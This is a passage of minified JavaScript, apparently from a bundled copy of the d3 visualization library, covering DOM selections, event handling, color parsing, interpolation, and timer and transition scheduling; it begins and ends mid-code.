"+e);for(i=this._[e],s=0,r=i.length;s<r;++s)i[s].value.apply(n,t)},apply:function(e,n,t){if(!this._.hasOwnProperty(e))throw new Error("unknown type: "+e);for(var s=this._[e],r=0,i=s.length;r<i;++r)s[r].value.apply(n,t)}};function cy(e,n){for(var t=0,s=e.length,r;t<s;++t)if((r=e[t]).name===n)return r.value}function zc(e,n,t){for(var s=0,r=e.length;s<r;++s)if(e[s].name===n){e[s]=ly,e=e.slice(0,s).concat(e.slice(s+1));break}return t!=null&&e.push({name:n,value:t}),e}var nl="http://www.w3.org/1999/xhtml";const jc={svg:"http://www.w3.org/2000/svg",xhtml:nl,xlink:"http://www.w3.org/1999/xlink",xml:"http://www.w3.org/XML/1998/namespace",xmlns:"http://www.w3.org/2000/xmlns/"};function Ti(e){var n=e+="",t=n.indexOf(":");return t>=0&&(n=e.slice(0,t))!=="xmlns"&&(e=e.slice(t+1)),jc.hasOwnProperty(n)?{space:jc[n],local:e}:e}function uy(e){return function(){var n=this.ownerDocument,t=this.namespaceURI;return t===nl&&n.documentElement.namespaceURI===nl?n.createElement(e):n.createElementNS(t,e)}}function py(e){return function(){return this.ownerDocument.createElementNS(e.space,e.local)}}function Cd(e){var n=Ti(e);return(n.local?py:uy)(n)}function dy(){}function co(e){return e==null?dy:function(){return this.querySelector(e)}}function hy(e){typeof e!="function"&&(e=co(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=new Array(a),o,c,u=0;u<a;++u)(o=i[u])&&(c=e.call(o,o.__data__,u,i))&&("__data__"in o&&(c.__data__=o.__data__),l[u]=c);return new Oe(s,this._parents)}function fy(e){return e==null?[]:Array.isArray(e)?e:Array.from(e)}function my(){return[]}function Pd(e){return e==null?my:function(){return this.querySelectorAll(e)}}function gy(e){return function(){return fy(e.apply(this,arguments))}}function yy(e){typeof e=="function"?e=gy(e):e=Pd(e);for(var n=this._groups,t=n.length,s=[],r=[],i=0;i<t;++i)for(var a=n[i],l=a.length,o,c=0;c<l;++c)(o=a[c])&&(s.push(e.call(o,o.__data__,c,a)),r.push(o));return new Oe(s,r)}function Ad(e){return function(){return this.matches(e)}}function Ld(e){return function(n){return n.matches(e)}}var vy=Array.prototype.find;function wy(e){return function(){return vy.call(this.children,e)}}function ky(){return this.firstElementChild}function by(e){return this.select(e==null?ky:wy(typeof e=="function"?e:Ld(e)))}var xy=Array.prototype.filter;function Sy(){return Array.from(this.children)}function _y(e){return function(){return xy.call(this.children,e)}}function Ey(e){return this.selectAll(e==null?Sy:_y(typeof e=="function"?e:Ld(e)))}function Ty(e){typeof e!="function"&&(e=Ad(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=[],o,c=0;c<a;++c)(o=i[c])&&e.call(o,o.__data__,c,i)&&l.push(o);return new Oe(s,this._parents)}function Nd(e){return new Array(e.length)}function Cy(){return new Oe(this._enter||this._groups.map(Nd),this._parents)}function si(e,n){this.ownerDocument=e.ownerDocument,this.namespaceURI=e.namespaceURI,this._next=null,this._parent=e,this.__data__=n}si.prototype={constructor:si,appendChild:function(e){return this._parent.insertBefore(e,this._next)},insertBefore:function(e,n){return this._parent.insertBefore(e,n)},querySelector:function(e){return this._parent.querySelector(e)},querySelectorAll:function(e){return this._parent.querySelectorAll(e)}};function Py(e){return function(){return e}}function Ay(e,n,t,s,r,i){for(var a=0,l,o=n.length,c=i.length;a<c;++a)(l=n[a])?(l.__data__=i[a],s[a]=l):t[a]=new si(e,i[a]);for(;a<o;++a)(l=n[a])&&(r[a]=l)}function Ly(e,n,t,s,r,i,a){var l,o,c=new Map,u=n.length,d=i.length,h=new Array(u),v;for(l=0;l<u;++l)(o=n[l])&&(h[l]=v=a.call(o,o.__data__,l,n)+"",c.has(v)?r[l]=o:c.set(v,o));for(l=0;l<d;++l)v=a.call(e,i[l],l,i)+"",(o=c.get(v))?(s[l]=o,o.__data__=i[l],c.delete(v)):t[l]=new si(e,i[l]);for(l=0;l<u;++l)(o=n[l])&&c.get(h[l])===o&&(r[l]=o)}function Ny(e){return e.__data__}function Ry(e,n){if(!arguments.length)return Array.from(this,Ny);var t=n?Ly:Ay,s=this._parents,r=this._groups;typeof e!="function"&&(e=Py(e));for(var i=r.length,a=new Array(i),l=new Array(i),o=new Array(i),c=0;c<i;++c){var u=s[c],d=r[c],h=d.length,v=Oy(e.call(u,u&&u.__data__,c,s)),k=v.length,x=l[c]=new Array(k),A=a[c]=new Array(k),p=o[c]=new Array(h);t(u,d,x,A,p,v,n);for(var f=0,m=0,S,T;f<k;++f)if(S=x[f]){for(f>=m&&(m=f+1);!(T=A[m])&&++m<k;);S._next=T||null}}return a=new Oe(a,s),a._enter=l,a._exit=o,a}function Oy(e){return typeof e=="object"&&"length"in e?e:Array.from(e)}function My(){return new Oe(this._exit||this._groups.map(Nd),this._parents)}function Iy(e,n,t){var s=this.enter(),r=this,i=this.exit();return typeof e=="function"?(s=e(s),s&&(s=s.selection())):s=s.append(e+""),n!=null&&(r=n(r),r&&(r=r.selection())),t==null?i.remove():t(i),s&&r?s.merge(r).order():r}function Dy(e){for(var n=e.selection?e.selection():e,t=this._groups,s=n._groups,r=t.length,i=s.length,a=Math.min(r,i),l=new Array(r),o=0;o<a;++o)for(var c=t[o],u=s[o],d=c.length,h=l[o]=new Array(d),v,k=0;k<d;++k)(v=c[k]||u[k])&&(h[k]=v);for(;o<r;++o)l[o]=t[o];return new Oe(l,this._parents)}function zy(){for(var e=this._groups,n=-1,t=e.length;++n<t;)for(var s=e[n],r=s.length-1,i=s[r],a;--r>=0;)(a=s[r])&&(i&&a.compareDocumentPosition(i)^4&&i.parentNode.insertBefore(a,i),i=a);return this}function jy(e){e||(e=By);function n(d,h){return d&&h?e(d.__data__,h.__data__):!d-!h}for(var t=this._groups,s=t.length,r=new Array(s),i=0;i<s;++i){for(var a=t[i],l=a.length,o=r[i]=new Array(l),c,u=0;u<l;++u)(c=a[u])&&(o[u]=c);o.sort(n)}return new Oe(r,this._parents).order()}function By(e,n){return e<n?-1:e>n?1:e>=n?0:NaN}function Fy(){var e=arguments[0];return arguments[0]=this,e.apply(null,arguments),this}function Uy(){return Array.from(this)}function Hy(){for(var e=this._groups,n=0,t=e.length;n<t;++n)for(var s=e[n],r=0,i=s.length;r<i;++r){var a=s[r];if(a)return a}return null}function Vy(){let e=0;for(const n of this)++e;return e}function Wy(){return!this.node()}function $y(e){for(var n=this._groups,t=0,s=n.length;t<s;++t)for(var r=n[t],i=0,a=r.length,l;i<a;++i)(l=r[i])&&e.call(l,l.__data__,i,r);return this}function Gy(e){return function(){this.removeAttribute(e)}}function Yy(e){return function(){this.removeAttributeNS(e.space,e.local)}}function qy(e,n){return function(){this.setAttribute(e,n)}}function Xy(e,n){return function(){this.setAttributeNS(e.space,e.local,n)}}function Ky(e,n){return function(){var t=n.apply(this,arguments);t==null?this.removeAttribute(e):this.setAttribute(e,t)}}function Qy(e,n){return function(){var t=n.apply(this,arguments);t==null?this.removeAttributeNS(e.space,e.local):this.setAttributeNS(e.space,e.local,t)}}function Zy(e,n){var t=Ti(e);if(arguments.length<2){var s=this.node();return t.local?s.getAttributeNS(t.space,t.local):s.getAttribute(t)}return this.each((n==null?t.local?Yy:Gy:typeof n=="function"?t.local?Qy:Ky:t.local?Xy:qy)(t,n))}function Rd(e){return e.ownerDocument&&e.ownerDocument.defaultView||e.document&&e||e.defaultView}function Jy(e){return function(){this.style.removeProperty(e)}}function ev(e,n,t){return function(){this.style.setProperty(e,n,t)}}function nv(e,n,t){return function(){var s=n.apply(this,arguments);s==null?this.style.removeProperty(e):this.style.setProperty(e,s,t)}}function tv(e,n,t){return arguments.length>1?this.each((n==null?Jy:typeof n=="function"?nv:ev)(e,n,t??"")):Bt(this.node(),e)}function Bt(e,n){return e.style.getPropertyValue(n)||Rd(e).getComputedStyle(e,null).getPropertyValue(n)}function sv(e){return function(){delete this[e]}}function rv(e,n){return function(){this[e]=n}}function iv(e,n){return function(){var t=n.apply(this,arguments);t==null?delete this[e]:this[e]=t}}function av(e,n){return arguments.length>1?this.each((n==null?sv:typeof n=="function"?iv:rv)(e,n)):this.node()[e]}function Od(e){return e.trim().split(/^|\s+/)}function uo(e){return e.classList||new Md(e)}function Md(e){this._node=e,this._names=Od(e.getAttribute("class")||"")}Md.prototype={add:function(e){var n=this._names.indexOf(e);n<0&&(this._names.push(e),this._node.setAttribute("class",this._names.join(" ")))},remove:function(e){var n=this._names.indexOf(e);n>=0&&(this._names.splice(n,1),this._node.setAttribute("class",this._names.join(" ")))},contains:function(e){return this._names.indexOf(e)>=0}};function Id(e,n){for(var t=uo(e),s=-1,r=n.length;++s<r;)t.add(n[s])}function Dd(e,n){for(var t=uo(e),s=-1,r=n.length;++s<r;)t.remove(n[s])}function lv(e){return function(){Id(this,e)}}function ov(e){return function(){Dd(this,e)}}function cv(e,n){return function(){(n.apply(this,arguments)?Id:Dd)(this,e)}}function uv(e,n){var t=Od(e+"");if(arguments.length<2){for(var s=uo(this.node()),r=-1,i=t.length;++r<i;)if(!s.contains(t[r]))return!1;return!0}return this.each((typeof n=="function"?cv:n?lv:ov)(t,n))}function pv(){this.textContent=""}function dv(e){return function(){this.textContent=e}}function hv(e){return function(){var n=e.apply(this,arguments);this.textContent=n??""}}function fv(e){return arguments.length?this.each(e==null?pv:(typeof e=="function"?hv:dv)(e)):this.node().textContent}function mv(){this.innerHTML=""}function gv(e){return function(){this.innerHTML=e}}function yv(e){return function(){var n=e.apply(this,arguments);this.innerHTML=n??""}}function vv(e){return arguments.length?this.each(e==null?mv:(typeof e=="function"?yv:gv)(e)):this.node().innerHTML}function wv(){this.nextSibling&&this.parentNode.appendChild(this)}function kv(){return this.each(wv)}function bv(){this.previousSibling&&this.parentNode.insertBefore(this,this.parentNode.firstChild)}function xv(){return this.each(bv)}function Sv(e){var n=typeof e=="function"?e:Cd(e);return this.select(function(){return this.appendChild(n.apply(this,arguments))})}function _v(){return null}function Ev(e,n){var t=typeof e=="function"?e:Cd(e),s=n==null?_v:typeof n=="function"?n:co(n);return this.select(function(){return this.insertBefore(t.apply(this,arguments),s.apply(this,arguments)||null)})}function Tv(){var e=this.parentNode;e&&e.removeChild(this)}function Cv(){return this.each(Tv)}function Pv(){var e=this.cloneNode(!1),n=this.parentNode;return n?n.insertBefore(e,this.nextSibling):e}function Av(){var e=this.cloneNode(!0),n=this.parentNode;return n?n.insertBefore(e,this.nextSibling):e}function Lv(e){return this.select(e?Av:Pv)}function Nv(e){return arguments.length?this.property("__data__",e):this.node().__data__}function Rv(e){return function(n){e.call(this,n,this.__data__)}}function Ov(e){return e.trim().split(/^|\s+/).map(function(n){var t="",s=n.indexOf(".");return s>=0&&(t=n.slice(s+1),n=n.slice(0,s)),{type:n,name:t}})}function Mv(e){return function(){var n=this.__on;if(n){for(var t=0,s=-1,r=n.length,i;t<r;++t)i=n[t],(!e.type||i.type===e.type)&&i.name===e.name?this.removeEventListener(i.type,i.listener,i.options):n[++s]=i;++s?n.length=s:delete this.__on}}}function Iv(e,n,t){return function(){var s=this.__on,r,i=Rv(n);if(s){for(var a=0,l=s.length;a<l;++a)if((r=s[a]).type===e.type&&r.name===e.name){this.removeEventListener(r.type,r.listener,r.options),this.addEventListener(r.type,r.listener=i,r.options=t),r.value=n;return}}this.addEventListener(e.type,i,t),r={type:e.type,name:e.name,value:n,listener:i,options:t},s?s.push(r):this.__on=[r]}}function Dv(e,n,t){var s=Ov(e+""),r,i=s.length,a;if(arguments.length<2){var l=this.node().__on;if(l){for(var o=0,c=l.length,u;o<c;++o)for(r=0,u=l[o];r<i;++r)if((a=s[r]).type===u.type&&a.name===u.name)return u.value}return}for(l=n?Iv:Mv,r=0;r<i;++r)this.each(l(s[r],n,t));return this}function zd(e,n,t){var s=Rd(e),r=s.CustomEvent;typeof r=="function"?r=new r(n,t):(r=s.document.createEvent("Event"),t?(r.initEvent(n,t.bubbles,t.cancelable),r.detail=t.detail):r.initEvent(n,!1,!1)),e.dispatchEvent(r)}function zv(e,n){return function(){return zd(this,e,n)}}function jv(e,n){return function(){return zd(this,e,n.apply(this,arguments))}}function Bv(e,n){return this.each((typeof n=="function"?jv:zv)(e,n))}function*Fv(){for(var e=this._groups,n=0,t=e.length;n<t;++n)for(var s=e[n],r=0,i=s.length,a;r<i;++r)(a=s[r])&&(yield a)}var jd=[null];function Oe(e,n){this._groups=e,this._parents=n}function Ys(){return new Oe([[document.documentElement]],jd)}function Uv(){return this}Oe.prototype=Ys.prototype={constructor:Oe,select:hy,selectAll:yy,selectChild:by,selectChildren:Ey,filter:Ty,data:Ry,enter:Cy,exit:My,join:Iy,merge:Dy,selection:Uv,order:zy,sort:jy,call:Fy,nodes:Uy,node:Hy,size:Vy,empty:Wy,each:$y,attr:Zy,style:tv,property:av,classed:uv,text:fv,html:vv,raise:kv,lower:xv,append:Sv,insert:Ev,remove:Cv,clone:Lv,datum:Nv,on:Dv,dispatch:Bv,[Symbol.iterator]:Fv};function Tn(e){return typeof e=="string"?new Oe([[document.querySelector(e)]],[document.documentElement]):new Oe([[e]],jd)}function Hv(e){let n;for(;n=e.sourceEvent;)e=n;return e}function $n(e,n){if(e=Hv(e),n===void 0&&(n=e.currentTarget),n){var t=n.ownerSVGElement||n;if(t.createSVGPoint){var s=t.createSVGPoint();return s.x=e.clientX,s.y=e.clientY,s=s.matrixTransform(n.getScreenCTM().inverse()),[s.x,s.y]}if(n.getBoundingClientRect){var r=n.getBoundingClientRect();return[e.clientX-r.left-n.clientLeft,e.clientY-r.top-n.clientTop]}}return[e.pageX,e.pageY]}const tl={capture:!0,passive:!1};function sl(e){e.preventDefault(),e.stopImmediatePropagation()}function Vv(e){var n=e.document.documentElement,t=Tn(e).on("dragstart.drag",sl,tl);"onselectstart"in n?t.on("selectstart.drag",sl,tl):(n.__noselect=n.style.MozUserSelect,n.style.MozUserSelect="none")}function Wv(e,n){var t=e.document.documentElement,s=Tn(e).on("dragstart.drag",null);n&&(s.on("click.drag",sl,tl),setTimeout(function(){s.on("click.drag",null)},0)),"onselectstart"in t?s.on("selectstart.drag",null):(t.style.MozUserSelect=t.__noselect,delete t.__noselect)}function po(e,n,t){e.prototype=n.prototype=t,t.constructor=e}function Bd(e,n){var t=Object.create(e.prototype);for(var s in n)t[s]=n[s];return t}function qs(){}var Ds=.7,ri=1/Ds,Nt="\\s*([+-]?\\d+)\\s*",zs="\\s*([+-]?(?:\\d*\\.)?\\d+(?:[eE][+-]?\\d+)?)\\s*",sn="\\s*([+-]?(?:\\d*\\.)?\\d+(?:[eE][+-]?\\d+)?)%\\s*",$v=/^#([0-9a-f]{3,8})$/,Gv=new RegExp(`^rgb\\(${Nt},${Nt},${Nt}\\)$`),Yv=new RegExp(`^rgb\\(${sn},${sn},${sn}\\)$`),qv=new RegExp(`^rgba\\(${Nt},${Nt},${Nt},${zs}\\)$`),Xv=new RegExp(`^rgba\\(${sn},${sn},${sn},${zs}\\)$`),Kv=new RegExp(`^hsl\\(${zs},${sn},${sn}\\)$`),Qv=new RegExp(`^hsla\\(${zs},${sn},${sn},${zs}\\)$`),Bc={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};po(qs,js,{copy(e){return Object.assign(new this.constructor,this,e)},displayable(){return this.rgb().displayable()},hex:Fc,formatHex:Fc,formatHex8:Zv,formatHsl:Jv,formatRgb:Uc,toString:Uc});function Fc(){return this.rgb().formatHex()}function Zv(){return this.rgb().formatHex8()}function Jv(){return Fd(this).formatHsl()}function Uc(){return this.rgb().formatRgb()}function js(e){var n,t;return e=(e+"").trim().toLowerCase(),(n=$v.exec(e))?(t=n[1].length,n=parseInt(n[1],16),t===6?Hc(n):t===3?new Ee(n>>8&15|n>>4&240,n>>4&15|n&240,(n&15)<<4|n&15,1):t===8?dr(n>>24&255,n>>16&255,n>>8&255,(n&255)/255):t===4?dr(n>>12&15|n>>8&240,n>>8&15|n>>4&240,n>>4&15|n&240,((n&15)<<4|n&15)/255):null):(n=Gv.exec(e))?new Ee(n[1],n[2],n[3],1):(n=Yv.exec(e))?new Ee(n[1]*255/100,n[2]*255/100,n[3]*255/100,1):(n=qv.exec(e))?dr(n[1],n[2],n[3],n[4]):(n=Xv.exec(e))?dr(n[1]*255/100,n[2]*255/100,n[3]*255/100,n[4]):(n=Kv.exec(e))?$c(n[1],n[2]/100,n[3]/100,1):(n=Qv.exec(e))?$c(n[1],n[2]/100,n[3]/100,n[4]):Bc.hasOwnProperty(e)?Hc(Bc[e]):e==="transparent"?new Ee(NaN,NaN,NaN,0):null}function Hc(e){return new Ee(e>>16&255,e>>8&255,e&255,1)}function dr(e,n,t,s){return s<=0&&(e=n=t=NaN),new Ee(e,n,t,s)}function e0(e){return e instanceof qs||(e=js(e)),e?(e=e.rgb(),new Ee(e.r,e.g,e.b,e.opacity)):new Ee}function rl(e,n,t,s){return arguments.length===1?e0(e):new Ee(e,n,t,s??1)}function Ee(e,n,t,s){this.r=+e,this.g=+n,this.b=+t,this.opacity=+s}po(Ee,rl,Bd(qs,{brighter(e){return e=e==null?ri:Math.pow(ri,e),new Ee(this.r*e,this.g*e,this.b*e,this.opacity)},darker(e){return e=e==null?Ds:Math.pow(Ds,e),new Ee(this.r*e,this.g*e,this.b*e,this.opacity)},rgb(){return this},clamp(){return new Ee(et(this.r),et(this.g),et(this.b),ii(this.opacity))},displayable(){return-.5<=this.r&&this.r<255.5&&-.5<=this.g&&this.g<255.5&&-.5<=this.b&&this.b<255.5&&0<=this.opacity&&this.opacity<=1},hex:Vc,formatHex:Vc,formatHex8:n0,formatRgb:Wc,toString:Wc}));function Vc(){return`#${Qn(this.r)}${Qn(this.g)}${Qn(this.b)}`}function n0(){return`#${Qn(this.r)}${Qn(this.g)}${Qn(this.b)}${Qn((isNaN(this.opacity)?1:this.opacity)*255)}`}function Wc(){const e=ii(this.opacity);return`${e===1?"rgb(":"rgba("}${et(this.r)}, ${et(this.g)}, ${et(this.b)}${e===1?")":`, ${e})`}`}function ii(e){return isNaN(e)?1:Math.max(0,Math.min(1,e))}function et(e){return Math.max(0,Math.min(255,Math.round(e)||0))}function Qn(e){return e=et(e),(e<16?"0":"")+e.toString(16)}function $c(e,n,t,s){return s<=0?e=n=t=NaN:t<=0||t>=1?e=n=NaN:n<=0&&(e=NaN),new Ye(e,n,t,s)}function Fd(e){if(e instanceof Ye)return new Ye(e.h,e.s,e.l,e.opacity);if(e instanceof qs||(e=js(e)),!e)return new Ye;if(e instanceof Ye)return e;e=e.rgb();var n=e.r/255,t=e.g/255,s=e.b/255,r=Math.min(n,t,s),i=Math.max(n,t,s),a=NaN,l=i-r,o=(i+r)/2;return l?(n===i?a=(t-s)/l+(t<s)*6:t===i?a=(s-n)/l+2:a=(n-t)/l+4,l/=o<.5?i+r:2-i-r,a*=60):l=o>0&&o<1?0:a,new Ye(a,l,o,e.opacity)}function t0(e,n,t,s){return arguments.length===1?Fd(e):new Ye(e,n,t,s??1)}function Ye(e,n,t,s){this.h=+e,this.s=+n,this.l=+t,this.opacity=+s}po(Ye,t0,Bd(qs,{brighter(e){return e=e==null?ri:Math.pow(ri,e),new Ye(this.h,this.s,this.l*e,this.opacity)},darker(e){return e=e==null?Ds:Math.pow(Ds,e),new Ye(this.h,this.s,this.l*e,this.opacity)},rgb(){var e=this.h%360+(this.h<0)*360,n=isNaN(e)||isNaN(this.s)?0:this.s,t=this.l,s=t+(t<.5?t:1-t)*n,r=2*t-s;return new Ee(sa(e>=240?e-240:e+120,r,s),sa(e,r,s),sa(e<120?e+240:e-120,r,s),this.opacity)},clamp(){return new Ye(Gc(this.h),hr(this.s),hr(this.l),ii(this.opacity))},displayable(){return(0<=this.s&&this.s<=1||isNaN(this.s))&&0<=this.l&&this.l<=1&&0<=this.opacity&&this.opacity<=1},formatHsl(){const e=ii(this.opacity);return`${e===1?"hsl(":"hsla("}${Gc(this.h)}, ${hr(this.s)*100}%, ${hr(this.l)*100}%${e===1?")":`, ${e})`}`}}));function Gc(e){return e=(e||0)%360,e<0?e+360:e}function hr(e){return Math.max(0,Math.min(1,e||0))}function sa(e,n,t){return(e<60?n+(t-n)*e/60:e<180?t:e<240?n+(t-n)*(240-e)/60:n)*255}const Ud=e=>()=>e;function s0(e,n){return function(t){return e+t*n}}function r0(e,n,t){return e=Math.pow(e,t),n=Math.pow(n,t)-e,t=1/t,function(s){return Math.pow(e+s*n,t)}}function i0(e){return(e=+e)==1?Hd:function(n,t){return t-n?r0(n,t,e):Ud(isNaN(n)?t:n)}}function Hd(e,n){var t=n-e;return t?s0(e,t):Ud(isNaN(e)?n:e)}const Yc=function e(n){var t=i0(n);function s(r,i){var a=t((r=rl(r)).r,(i=rl(i)).r),l=t(r.g,i.g),o=t(r.b,i.b),c=Hd(r.opacity,i.opacity);return function(u){return r.r=a(u),r.g=l(u),r.b=o(u),r.opacity=c(u),r+""}}return s.gamma=e,s}(1);function Sn(e,n){return e=+e,n=+n,function(t){return e*(1-t)+n*t}}var il=/[-+]?(?:\d+\.?\d*|\.?\d+)(?:[eE][-+]?\d+)?/g,ra=new RegExp(il.source,"g");function a0(e){return function(){return e}}function l0(e){return function(n){return e(n)+""}}function o0(e,n){var t=il.lastIndex=ra.lastIndex=0,s,r,i,a=-1,l=[],o=[];for(e=e+"",n=n+"";(s=il.exec(e))&&(r=ra.exec(n));)(i=r.index)>t&&(i=n.slice(t,i),l[a]?l[a]+=i:l[++a]=i),(s=s[0])===(r=r[0])?l[a]?l[a]+=r:l[++a]=r:(l[++a]=null,o.push({i:a,x:Sn(s,r)})),t=ra.lastIndex;return t<n.length&&(i=n.slice(t),l[a]?l[a]+=i:l[++a]=i),l.length<2?o[0]?l0(o[0].x):a0(n):(n=o.length,function(c){for(var u=0,d;u<n;++u)l[(d=o[u]).i]=d.x(c);return l.join("")})}var qc=180/Math.PI,al={translateX:0,translateY:0,rotate:0,skewX:0,scaleX:1,scaleY:1};function Vd(e,n,t,s,r,i){var a,l,o;return(a=Math.sqrt(e*e+n*n))&&(e/=a,n/=a),(o=e*t+n*s)&&(t-=e*o,s-=n*o),(l=Math.sqrt(t*t+s*s))&&(t/=l,s/=l,o/=l),e*s<n*t&&(e=-e,n=-n,o=-o,a=-a),{translateX:r,translateY:i,rotate:Math.atan2(n,e)*qc,skewX:Math.atan(o)*qc,scaleX:a,scaleY:l}}var fr;function c0(e){const n=new(typeof DOMMatrix=="function"?DOMMatrix:WebKitCSSMatrix)(e+"");return n.isIdentity?al:Vd(n.a,n.b,n.c,n.d,n.e,n.f)}function u0(e){return e==null||(fr||(fr=document.createElementNS("http://www.w3.org/2000/svg","g")),fr.setAttribute("transform",e),!(e=fr.transform.baseVal.consolidate()))?al:(e=e.matrix,Vd(e.a,e.b,e.c,e.d,e.e,e.f))}function Wd(e,n,t,s){function r(c){return c.length?c.pop()+" ":""}function i(c,u,d,h,v,k){if(c!==d||u!==h){var x=v.push("translate(",null,n,null,t);k.push({i:x-4,x:Sn(c,d)},{i:x-2,x:Sn(u,h)})}else(d||h)&&v.push("translate("+d+n+h+t)}function a(c,u,d,h){c!==u?(c-u>180?u+=360:u-c>180&&(c+=360),h.push({i:d.push(r(d)+"rotate(",null,s)-2,x:Sn(c,u)})):u&&d.push(r(d)+"rotate("+u+s)}function l(c,u,d,h){c!==u?h.push({i:d.push(r(d)+"skewX(",null,s)-2,x:Sn(c,u)}):u&&d.push(r(d)+"skewX("+u+s)}function o(c,u,d,h,v,k){if(c!==d||u!==h){var x=v.push(r(v)+"scale(",null,",",null,")");k.push({i:x-4,x:Sn(c,d)},{i:x-2,x:Sn(u,h)})}else(d!==1||h!==1)&&v.push(r(v)+"scale("+d+","+h+")")}return function(c,u){var d=[],h=[];return c=e(c),u=e(u),i(c.translateX,c.translateY,u.translateX,u.translateY,d,h),a(c.rotate,u.rotate,d,h),l(c.skewX,u.skewX,d,h),o(c.scaleX,c.scaleY,u.scaleX,u.scaleY,d,h),c=u=null,function(v){for(var k=-1,x=h.length,A;++k<x;)d[(A=h[k]).i]=A.x(v);return d.join("")}}}var p0=Wd(c0,"px, ","px)","deg)"),d0=Wd(u0,", ",")",")"),h0=1e-12;function Xc(e){return((e=Math.exp(e))+1/e)/2}function f0(e){return((e=Math.exp(e))-1/e)/2}function m0(e){return((e=Math.exp(2*e))-1)/(e+1)}const g0=function e(n,t,s){function r(i,a){var l=i[0],o=i[1],c=i[2],u=a[0],d=a[1],h=a[2],v=u-l,k=d-o,x=v*v+k*k,A,p;if(x<h0)p=Math.log(h/c)/n,A=function(g){return[l+g*v,o+g*k,c*Math.exp(n*g*p)]};else{var f=Math.sqrt(x),m=(h*h-c*c+s*x)/(2*c*t*f),S=(h*h-c*c-s*x)/(2*h*t*f),T=Math.log(Math.sqrt(m*m+1)-m),I=Math.log(Math.sqrt(S*S+1)-S);p=(I-T)/n,A=function(g){var b=g*p,M=Xc(T),N=c/(t*f)*(M*m0(n*b+T)-f0(T));return[l+N*v,o+N*k,c*M/Xc(n*b+T)]}}return A.duration=p*1e3*n/Math.SQRT2,A}return r.rho=function(i){var a=Math.max(.001,+i),l=a*a,o=l*l;return e(a,l,o)},r}(Math.SQRT2,2,4);var Ft=0,as=0,es=0,$d=1e3,ai,ls,li=0,at=0,Ci=0,Bs=typeof performance=="object"&&performance.now?performance:Date,Gd=typeof window=="object"&&window.requestAnimationFrame?window.requestAnimationFrame.bind(window):function(e){setTimeout(e,17)};function ho(){return at||(Gd(y0),at=Bs.now()+Ci)}function y0(){at=0}function oi(){this._call=this._time=this._next=null}oi.prototype=Yd.prototype={constructor:oi,restart:function(e,n,t){if(typeof e!="function")throw new TypeError("callback is not a function");t=(t==null?ho():+t)+(n==null?0:+n),!this._next&&ls!==this&&(ls?ls._next=this:ai=this,ls=this),this._call=e,this._time=t,ll()},stop:function(){this._call&&(this._call=null,this._time=1/0,ll())}};function Yd(e,n,t){var s=new oi;return s.restart(e,n,t),s}function v0(){ho(),++Ft;for(var e=ai,n;e;)(n=at-e._time)>=0&&e._call.call(void 0,n),e=e._next;--Ft}function Kc(){at=(li=Bs.now())+Ci,Ft=as=0;try{v0()}finally{Ft=0,k0(),at=0}}function w0(){var e=Bs.now(),n=e-li;n>$d&&(Ci-=n,li=e)}function k0(){for(var e,n=ai,t,s=1/0;n;)n._call?(s>n._time&&(s=n._time),e=n,n=n._next):(t=n._next,n._next=null,n=e?e._next=t:ai=t);ls=e,ll(s)}function ll(e){if(!Ft){as&&(as=clearTimeout(as));var n=e-at;n>24?(e<1/0&&(as=setTimeout(Kc,e-Bs.now()-Ci)),es&&(es=clearInterval(es))):(es||(li=Bs.now(),es=setInterval(w0,$d)),Ft=1,Gd(Kc))}}function Qc(e,n,t){var s=new oi;return n=n==null?0:+n,s.restart(r=>{s.stop(),e(r+n)},n,t),s}var b0=oo("start","end","cancel","interrupt"),x0=[],qd=0,Zc=1,ol=2,Ar=3,Jc=4,cl=5,Lr=6;function Pi(e,n,t,s,r,i){var a=e.__transition;if(!a)e.__transition={};else 